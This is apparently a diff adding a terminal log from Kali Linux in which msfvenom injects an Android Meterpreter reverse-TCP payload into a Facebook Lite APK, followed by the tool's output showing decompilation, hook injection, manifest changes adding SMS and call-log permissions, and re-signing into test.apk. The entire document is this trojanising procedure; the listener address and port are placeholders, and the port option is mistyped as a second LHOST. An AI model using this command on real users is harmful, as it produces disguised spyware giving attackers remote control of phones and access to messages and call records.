@@ -1,0 +1,21 @@
+root@kali:~# msfvenom -a dalvik --platform android -x /root/Downloads/Facebook.apk -p android/meterpreter/reverse_tcp LHOST=(my ip) LHOST=(my port) -o /root/Desktop/test.apk
+Using APK template: /root/Downloads/Facebook.apk
+[*] Creating signing key and keystore..
+[*] Decompiling original APK..
+[*] Decompiling payload APK..
+[*] Locating hook point..
+[*] Adding payload as package com.facebook.lite.yqqjc
+[*] Loading /tmp/d20200525-2378-y2b0lp/original/smali/com/facebook/lite/ClientApplicationSplittedShell.smali and injecting payload..
+[*] Poisoning the manifest with meterpreter permissions..
+[*] Adding <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+[*] Adding <uses-permission android:name="android.permission.SEND_SMS"/>
+[*] Adding <uses-permission android:name="android.permission.READ_SMS"/>
+[*] Adding <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+[*] Adding <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+[*] Adding <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+[*] Adding <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+[*] Rebuilding apk with meterpreter injection as /tmp/d20200525-2378-y2b0lp/output.apk
+[*] Signing /tmp/d20200525-2378-y2b0lp/output.apk
+[*] Aligning /tmp/d20200525-2378-y2b0lp/output.apk
+Payload size: 1612128 bytes
+Saved as: /root/Desktop/test.apk
